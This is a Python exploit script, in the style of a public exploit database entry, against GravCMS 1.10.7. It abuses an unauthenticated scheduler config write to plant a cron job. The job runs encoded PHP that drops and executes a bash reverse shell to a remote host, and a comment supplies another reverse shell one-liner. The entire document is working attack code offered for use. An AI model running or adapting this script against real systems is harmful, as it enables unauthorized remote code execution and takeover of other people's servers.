# Exploit Title: GravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated) (2)
# Original Exploit Author: Mehmet Ince 
# Vendor Homepage: https://getgrav.org
# Version: 1.10.7
# Tested on: Debian 10 
# Author: legend

#/usr/bin/python3

import requests
import sys
import re
import base64
target= "http://192.168.51.12"
#Change base64 encoded value with with below command.
#echo -ne "bash -i >& /dev/tcp/192.168.1.3/4444 0>&1" | base64 -w0
payload=b"""/*<?php /**/
posix_setuid(0);file_put_contents('/tmp/rev.sh',base64_decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ5LjUxLzgwIDA+JjE='));chmod('/tmp/rev.sh',0755);system('bash /tmp/rev.sh');
"""
s = requests.Session()
r = s.get(target+"/grav-admin/admin")
adminNonce = re.search(r'admin-nonce" value="(.*)"',r.text).group(1)
if adminNonce != "" :
    url = target + "/grav-admin/admin/tools/scheduler"
    data = "admin-nonce="+adminNonce
    data +='&task=SaveDefault&data%5bcustom_jobs%5d%5bncefs%5d%5bcommand%5d=/usr/bin/php&data%5bcustom_jobs%5d%5bncefs%5d%5bargs%5d=-r%20eval%28base64_decode%28%22'+base64.b64encode(payload).decode('utf-8')+'%22%29%29%3b&data%5bcustom_jobs%5d%5bncefs%5d%5bat%5d=%2a%20%2a%20%2a%20%2a%20%2a&data%5bcustom_jobs%5d%5bncefs%5d%5boutput%5d=&data%5bstatus%5d%5bncefs%5d=enabled&data%5bcustom_jobs%5d%5bncefs%5d%5boutput_mode%5d=append'
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    r = s.post(target+"/grav-admin/admin/config/scheduler",data=data,headers=headers)
                                                                                     
